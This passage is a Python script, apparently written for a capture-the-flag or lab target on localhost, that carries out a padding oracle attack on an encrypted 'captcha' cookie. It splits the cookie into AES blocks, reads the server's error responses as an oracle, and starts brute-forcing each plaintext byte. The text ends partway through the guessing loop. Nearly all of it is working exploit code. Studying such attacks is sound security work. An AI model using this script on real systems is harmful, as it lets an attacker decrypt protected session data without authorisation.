import base64
import requests
import time

# Configuration
base_url = "http://127.0.0.1:32834"
cookie_name = "captcha"
target_cookie = "2mArom13+gd4q/dQTQu4aFVpwOkejaqPtWuV0Kyn2ls="

# Decode the base64 cookie
cookie_bytes = base64.b64decode(target_cookie)
BLOCK_SIZE = 16
blocks = [cookie_bytes[i:i+BLOCK_SIZE] for i in range(0, len(cookie_bytes), BLOCK_SIZE)]

print(f"[+] Precise Padding Oracle Attack Implementation")
print(f"[+] Cookie has {len(blocks)} blocks (32 bytes)")

def make_request(modified_cookie):
    """Make a request with modified cookie and return response details"""
    try:
        session = requests.Session()
        session.cookies.set(cookie_name, modified_cookie)
        
        # Submit registration form - only need to trigger cookie decryption
        data = {
            'username': 'testuser',
            'captcha': 'test',
            'submit': 'Submit'
        }
        
        resp = session.post(base_url, data=data, timeout=8)
        return resp.text, resp.status_code, len(resp.text)
    except Exception as e:
        return f"Error: {e}", -1, 0

def is_padding_oracle(response_text, status_code):
    """
    Determine if response indicates valid or invalid padding
    Returns: True for valid padding, False for padding error
    """
    # "Invalid padding" = padding error
    if "Invalid padding" in response_text:
        return False
    # "Internal Server Error" with status 500 = likely padding error  
    if status_code == 500 and "Internal Server Error" in response_text:
        return False
    # "Invalid CAPTCHA!" = valid padding (decryption succeeded but content invalid)
    if "Invalid CAPTCHA!" in response_text:
        return True
    # Any other short response likely indicates valid padding
    if len(response_text) < 50 and status_code in [200, 403]:
        return True
    
    return False

def decrypt_block(iv, ciphertext, block_num):
    """Decrypt a single block using padding oracle"""
    print(f"\n{'='*60}")
    print(f"[*] Decrypting Block {block_num}")
    print(f"[*] IV: {iv.hex()}")
    print(f"[*] Ciphertext: {ciphertext.hex()}")
    print(f"{'='*60}")
    
    decrypted = bytearray(BLOCK_SIZE)
    original_iv = bytearray(iv)
    
    # For each byte position (from last to first)
    for pos in range(BLOCK_SIZE - 1, -1, -1):
        print(f"\n[+] Decrypting byte {pos:2d}... ", end="", flush=True)
        
        expected_padding = BLOCK_SIZE - pos
        attempts = 0
        found_value = None
        
        # Prepare IV with all known bytes set correctly
        test_iv = bytearray(original_iv)
        
        # Set padding for already decrypted bytes
        for i in range(pos + 1, BLOCK_SIZE):
            test_iv[i] = original_iv[i] ^ decrypted[i] ^ expected_padding
        
        # Try all possible byte values
        for guess in range(256):
            attempts += 1
            
            # Rate limiting - pause every 100 requests
            if attempts % 100 == 0:
                time.sleep(0.2)
            
            # Create modified IV for this guess
            modified_iv = bytearray(test_iv)
